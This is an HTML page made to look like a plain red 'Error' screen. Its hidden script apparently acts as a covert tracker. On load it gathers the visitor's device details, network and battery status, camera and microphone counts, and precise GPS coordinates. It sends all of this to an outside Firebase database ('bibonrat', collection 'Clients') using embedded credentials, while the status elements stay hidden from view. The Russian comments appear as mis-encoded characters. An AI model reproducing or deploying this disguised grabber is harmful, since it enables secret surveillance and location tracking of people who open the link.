<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Error</title>
</head>

<body style="margin:0; padding:0; background:black;">

    <div style="
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
            color: red;
            font-family: Arial, sans-serif;
            font-weight: bold;
            font-size: 12px;
            text-align: center;
         ">

        <div style="margin-bottom: 15px; letter-spacing: 3px;">
            A.&middot;.L.&middot;.G.&middot;.D.&middot;.G.&middot;.A.&middot;.D.&middot;.U.&middot;.
        </div>

        <div style="
            font-size: 40px;
            color: #ff0000;
            text-shadow: 0 0 10px red, 0 0 20px red;
        ">
            Error
        </div>

    </div>
    <!-- ‚úÖ –°–ö–†–´–¢–´–ï –≠–õ–ï–ú–ï–ù–¢–´, –ß–¢–û–ë–´ –ö–û–î –ù–ï –ü–ê–î–ê–õ -->
    <div id="authStatus" style="display:none"></div>
    <div id="locationStatus" style="display:none"></div>
    <div id="firestoreStatus" style="display:none"></div>
    <table style="display:none"><tbody id="infoBody"></tbody></table>


    <!-- –í–ê–ñ–ù–û: Modular Firebase SDK (–ø–∏—à–µ–º –≤ –∏–º–µ–Ω–æ–≤–∞–Ω–Ω—É—é –ë–î fishbibon) -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        // üîë –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Firebase (—Ç–≤–æ–∏ –∫–ª—é—á–∏)
        const firebaseConfig = {
            apiKey: "AIzaSyAQlLh2Abk92sZVCSsYSCxvps4Uld3C1Lk",
            authDomain: "bibonrat.firebaseapp.com",
            databaseURL: "https://bibonrat-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "bibonrat",
            storageBucket: "bibonrat.firebasestorage.app",
            messagingSenderId: "78759159251",
            appId: "1:78759159251:web:3e40d7d5a2aa762f01bb26"
        };

        // ‚úÖ –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø
        const app = initializeApp(firebaseConfig);

        // ‚úÖ –í–´–ë–ò–†–ê–ï–ú –ò–ú–ï–ù–ù–û –ë–ê–ó–£ Firestore: fishbibon (–∞ –Ω–µ default)
        const DB_NAME = "fishbibon";
        const db = getFirestore(app, DB_NAME);

        // ‚úÖ Auth (–∞–Ω–æ–Ω–∏–º–Ω–æ) ‚Äî —á—Ç–æ–±—ã –ø—Ä–∞–≤–∏–ª–∞ request.auth != null –ø—Ä–æ–ø—É—Å–∫–∞–ª–∏ –∑–∞–ø–∏—Å—å
        const auth = getAuth(app);

        // –ö–æ–ª–ª–µ–∫—Ü–∏—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è
        const COLLECTION_NAME = "Clients";

        // DOM
        const infoBody = document.getElementById("infoBody");
        const locationStatus = document.getElementById("locationStatus");
        const firestoreStatus = document.getElementById("firestoreStatus");
        const authStatus = document.getElementById("authStatus");

        // –•—Ä–∞–Ω–∏–ª–∏—â–µ –¥–∞–Ω–Ω—ã—Ö
        const collectedData = {};

        function setStatus(el, type, text) {
            el.className = "status " + type;
            el.innerText = text;
        }

        function addInfo(label, value) {
            if (value === undefined || value === null) value = "–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ";
            const row = document.createElement("tr");
            row.innerHTML = `<td>${label}</td><td>${value}</td>`;
            infoBody.appendChild(row);
            collectedData[label] = value;
        }

        // –ñ–¥—ë–º –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é (–±–µ–∑ –Ω–µ—ë –±—É–¥–µ—Ç Missing or insufficient permissions)
        let authReadyResolve;
        const authReady = new Promise((res) => (authReadyResolve = res));

        async function initAuth() {
            try {
                const cred = await signInAnonymously(auth);
                const uid = cred?.user?.uid || "unknown";
                addInfo("Firebase UID", uid);
                setStatus(authStatus, "success", "‚úÖ Firebase –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è (–∞–Ω–æ–Ω–∏–º–Ω–æ) —É—Å–ø–µ—à–Ω–∞");
                authReadyResolve(true);
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏:", error);
                setStatus(authStatus, "error", "‚ùå –û—à–∏–±–∫–∞ Firebase –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏: " + (error?.message || error));
                firestoreStatus.innerHTML = "‚ö†Ô∏è –ó–∞–ø–∏—Å—å –≤ Firestore –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞ –±–µ–∑ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏.";
                firestoreStatus.style.color = "red";
                authReadyResolve(false);
            }
        }

        async function saveToFirestore(data) {
            const ok = await authReady;
            if (!ok) return;

            try {
                data.timestamp = new Date().toISOString();
                data.pageUrl = location.href;
                data.firestoreDb = DB_NAME;

                const docRef = await addDoc(collection(db, COLLECTION_NAME), data);

                console.log("Saved to fishbibon. Doc ID:", docRef.id);
                firestoreStatus.innerHTML = `‚úÖ –î–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ Firestore "${DB_NAME}" (ID: ${docRef.id})`;
                firestoreStatus.style.color = "green";
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø–∏—Å–∏ –≤ Firestore:", error);
                firestoreStatus.innerHTML = `‚ùå –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è: ${error?.message || error}`;
                firestoreStatus.style.color = "red";
            }
        }

        // –ì–ª–∞–≤–Ω–∞—è –ª–æ–≥–∏–∫–∞
        (async function main() {
            // 0) –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è
            initAuth();

            // 1) –ë–∞–∑–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ
            addInfo("User Agent", navigator.userAgent);
            addInfo("–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞", navigator.platform);
            addInfo("–Ø–∑—ã–∫", navigator.language);
            addInfo("–†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞", `${screen.width} x ${screen.height}`);
            addInfo("–ì–ª—É–±–∏–Ω–∞ —Ü–≤–µ—Ç–∞", `${screen.colorDepth} –±–∏—Ç`);
            addInfo("–í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞", Intl.DateTimeFormat().resolvedOptions().timeZone);
            addInfo("–í–∫–ª—é—á—ë–Ω –ª–∏ cookie", navigator.cookieEnabled ? "–î–∞" : "–ù–µ—Ç");

            // 2) CPU –∏ –ø–∞–º—è—Ç—å
            addInfo("–Ø–¥—Ä–∞ CPU", navigator.hardwareConcurrency || "–Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
            addInfo("–û–ó–£ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞", navigator.deviceMemory ? navigator.deviceMemory + " GB" : "–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ");

            // 3) –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ç–∏
            if (navigator.connection) {
                const conn = navigator.connection;
                addInfo("–¢–∏–ø —Å–µ—Ç–∏", conn.effectiveType || "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ");
                addInfo("RTT (ms)", conn.rtt || "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ");
                addInfo("–°–∫–æ—Ä–æ—Å—Ç—å –∑–∞–≥—Ä—É–∑–∫–∏ (Mbps)", conn.downlink || "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ");
                addInfo("–≠–∫–æ–Ω–æ–º–∏—è –¥–∞–Ω–Ω—ã—Ö", conn.saveData ? "–≤–∫–ª—é—á–µ–Ω–∞" : "–æ—Ç–∫–ª—é—á–µ–Ω–∞");
            } else {
                addInfo("–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ç–∏", "–Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
            }

            // 4) –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±–∞—Ç–∞—Ä–µ–µ
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    addInfo("–£—Ä–æ–≤–µ–Ω—å –∑–∞—Ä—è–¥–∞", (battery.level * 100).toFixed(0) + "%");
                    addInfo("–ó–∞—Ä—è–∂–∞–µ—Ç—Å—è", battery.charging ? "–î–∞" : "–ù–µ—Ç");
                    if (!battery.charging && battery.dischargingTime !== Infinity) {
                        addInfo("–í—Ä–µ–º—è –¥–æ —Ä–∞–∑—Ä—è–¥–∫–∏", (battery.dischargingTime / 60).toFixed(0) + " –º–∏–Ω");
                    }
                } catch (e) {
                    addInfo("–°—Ç–∞—Ç—É—Å –±–∞—Ç–∞—Ä–µ–∏", "–æ—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞");
                }
            } else {
                addInfo("Battery API", "–Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
            }

            // 5) –ú–µ–¥–∏–∞-—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    const video = devices.filter(d => d.kind === "videoinput").length;
                    const audio = devices.filter(d => d.kind === "audioinput").length;
                    addInfo("–ö–∞–º–µ—Ä—ã", video);
                    addInfo("–ú–∏–∫—Ä–æ—Ñ–æ–Ω—ã", audio);
                } catch (e) {
                    addInfo("–ú–µ–¥–∏–∞-—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞", "–Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω—ã");
                }
            } else {
                addInfo("enumerateDevices", "–Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
            }

            // 6) –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è (GPS)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const { latitude, longitude, accuracy } = position.coords;
                        addInfo("–®–∏—Ä–æ—Ç–∞", latitude.toFixed(6));
                        addInfo("–î–æ–ª–≥–æ—Ç–∞", longitude.toFixed(6));
                        addInfo("–¢–æ—á–Ω–æ—Å—Ç—å GPS", accuracy.toFixed(1) + " –º");

                        setStatus(locationStatus, "success", "‚úÖ –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∞");
                        await saveToFirestore(collectedData);
                    },
                    async (error) => {
                        let msg = "";
                        switch (error.code) {
                            case error.PERMISSION_DENIED: msg = "‚ùå –î–æ—Å—Ç—É–ø –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∑–∞–ø—Ä–µ—â—ë–Ω"; break;
                            case error.POSITION_UNAVAILABLE: msg = "‚ùå –ü–æ–∑–∏—Ü–∏—è –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞"; break;
                            case error.TIMEOUT: msg = "‚ùå –¢–∞–π–º–∞—É—Ç –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏"; break;
                            default: msg = "‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏";
                        }

                        addInfo("–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è", msg);
                        setStatus(locationStatus, "error", msg);

                        await saveToFirestore(collectedData);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                addInfo("–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è", "–Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –±—Ä–∞—É–∑–µ—Ä–æ–º");
                setStatus(locationStatus, "error", "‚ùå –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
                await saveToFirestore(collectedData);
            }
        })();
    </script>
</body>
</html>
